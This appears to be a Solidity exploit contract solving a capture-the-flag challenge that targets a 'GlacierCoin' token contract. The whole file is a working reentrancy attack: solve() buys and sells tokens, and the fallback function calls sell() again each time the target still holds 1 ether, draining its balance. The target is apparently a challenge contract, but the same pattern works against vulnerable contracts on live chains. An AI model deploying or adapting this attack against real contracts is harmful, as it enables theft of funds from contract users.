// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Challenge.sol";
import "./Setup.sol";

contract Exploit {
    Setup public setup;
    GlacierCoin public coin;

    constructor(address _setup) payable {
        setup = Setup(_setup);
        coin = GlacierCoin(setup.TARGET());
    }

    function solve() public payable {
        coin.buy{value: 1 ether}();
        coin.sell(1 ether);
    }

    fallback() external payable {
        if (address(coin).balance >= 1 ether) {
            coin.sell(1 ether);
        }
    }
}
